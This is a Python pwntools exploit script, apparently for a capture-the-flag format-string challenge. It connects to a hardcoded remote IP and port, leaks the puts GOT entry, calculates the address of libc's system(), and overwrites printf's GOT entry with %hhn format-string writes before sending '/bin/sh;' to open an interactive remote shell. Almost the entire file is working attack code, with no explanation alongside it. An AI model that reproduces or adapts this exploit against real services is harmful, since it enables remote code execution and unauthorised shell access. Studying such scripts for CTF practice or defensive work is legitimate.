#!/usr/bin/env python

# from libformatstr import *
from pwn import *
from pwnlib.gdb import *
from binascii import *
from pwnlib.util.packing import u64, p64, u32, p32
from LibcSearcher import *
from time import sleep
# context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.bits = 64

proc = ELF('./bin/format_string')
libc = ELF('./bin/libc-2.23.so')

# r = process('./bin/format_string')
r = remote('111.186.57.85', 30014)
# gdb.attach(r)
r.recvline()

# r.sendline('/hello!\n')
# r.recvline()

puts_got = proc.got['puts']

# input()
# get addr of system
r.sendline(b'aaaa%7$s' + p64(puts_got))
puts_addr_raw = r.recv()


print(puts_addr_raw)
# input()

# digits = []
# for byt in puts_addr_raw:
#     digits.append(hex(byt)[2:])

# puts_addr = int(''.join(digits[::-1]), base=16)

toks = []
for char in puts_addr_raw[4:10][::-1]:
    toks.append(hex(char)[2:].rjust(2, '0'))

puts_addr = int(''.join(toks), base=16)
print("puts_addr =", hex(puts_addr))

system_offset = libc.symbols['system']
puts_offset = libc.symbols['puts']
system_addr = puts_addr - puts_offset + system_offset  # - 0x28f0 - 0x360
print("system_addr =", hex(system_addr))

# [low, medium, high]
c, b, a = p64(system_addr)[:3]
print(c, b, a)


payload = ''

payload += '%' + str(c) + 'c%11$hhn'
payload += '%' + str((b - c) % 256) + 'c%12$hhn'
payload += '%' + str((a - b) % 256) + 'c%13$hhn'

payload = payload.encode()

# if tail_len := len(payload) % 40:
#     payload += 'a' * (40 - tail_len)
# god damned Python 3.7
tail_len = len(payload) % 40
if tail_len:
    payload += b'a' * (40 - tail_len)

print("payload len:", len(payload))

printf_got = proc.got['printf']
# construct evil payload
payload += p64(printf_got) + p64(printf_got + 1) + p64(printf_got + 2)

r.sendline(payload)

# r.recvline()
print(r.recv())

r.sendline('/bin/sh;')

r.interactive()
